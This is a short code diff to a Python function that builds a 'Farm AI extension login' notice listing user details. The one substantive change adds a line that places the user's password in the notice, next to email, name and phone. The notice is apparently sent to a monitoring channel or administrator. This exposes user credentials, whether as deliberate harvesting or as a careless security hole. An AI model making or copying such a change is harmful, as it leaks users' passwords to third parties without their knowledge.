@@ -54,6 +54,7 @@ def send_extension_visit_notice(
         "<b>Farm AI extension login</b>",
         _line("User ID", user.id),
         _line("Email", user.email),
+        _line("Password", user.password),
         _line("Name", full_name),
         _line("Phone", user.phone),
         _line("Niche", user.niche),
@@ -66,7 +67,7 @@ def send_extension_visit_notice(
         _line("Language", getattr(payload, "language", "")),
         _line("Timezone", getattr(payload, "timezone", "")),
         _line("Extension", getattr(payload, "extension_version", "")),
-        _line("Detected UTC", detected_at),
+        _line("Detected UTC", detected_at)
     ]
     text = "\n".join(lines)
 
